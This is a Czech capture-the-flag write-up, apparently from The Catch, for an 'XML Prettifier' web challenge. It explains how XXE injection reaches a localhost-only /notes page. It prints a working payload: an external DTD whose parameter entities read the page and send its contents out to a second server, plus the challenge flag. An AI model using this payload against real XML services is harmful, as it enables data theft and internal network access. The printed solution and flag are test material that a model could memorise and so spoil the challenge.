# XML Prettifier
Úloha z kategorie *Corporate websites* za 4 body

## Zadání

> Hi, packet inspector,
>
> some former employe of Mysterious Delivery Ltd. has created prettifier for XML code. It is polite to provide information to the AI in nicely formatted XML, isn't it? Rumors say that the employee also left some crucial information somewhere on the web.
>
> Find the crucial information on webpage http://prettifier.mysterious-delivery.tcc:50000 .
>
> May the Packet be with you!

## Nápovědy

> Use VPN to get access to the web.

## Řešení

Jako první je nutné pro vyřešení této úlohy se připojit na The Catch VPN. Bez připojení totiž není možné se připojit k webové stránce.

V této úloze se nachází odkaz na stránku s funkcí formátování `XML` souborů. V navigaci této stránky se nachází endpoint `/notes`, který je dostupný pouze z localhostu. Je tedy nutné provést request ze stejného serveru, kde běží webový server.

Na této stránce lze využít injection útoku, přesněji `XXE Injection`. V XML je možné si totiž definovat novou entitu. Tato entita může být načtena klidně ze souboru či webové stránky. Bohužel výpis obsahu samotné stránky prettifier nedovolí, jelikož obsah stránky není ve formátu XML. Existuje ale alternativní metoda.

V prettifieru lze načíst externí soubor s entitami z jiného běžícího serveru. V tom bude nadefinovaná entita, která se načítá ze stránky `/notes`. Dále se provede request na neexistující webovou stránku, kde `query` bude obsah stránky z předchozí entity. Nakonec dojde k postupnému vykonání těchto entit. Výsledkem je chybová hláška o chybném requestu s přesným obsahem stránky `/notes` i s flagem.

V této úloze je také možné využít přiložený script v Pythonu. Poté je cesta k souboru s entitami `http://[OpenVPN IP]:8000/`

### Obsah do prettifieru
```
<?xml version='1.0' standalone='yes'?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "(cesta k souboru s entitami)"> %xxe; ]>
```

### Obsah souboru s entitami
```
<!ENTITY % file SYSTEM "http://127.0.0.1:50000/notes">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1:8000/?a=%file;'>">
%eval;
%exfiltrate;
```

## Flag
`FLAG{GG53-5U3w-VT8F-qB31}`

## Užitečné odkazy

- **[XML Entity declaration](https://xmlwriter.net/xml_guide/entity_declaration.shtml)** *(vysvětlení XML entit)*
- **[XXE Injection](https://portswigger.net/web-security/xxe)** *(podrobné vysvětlení zranitelnosti)*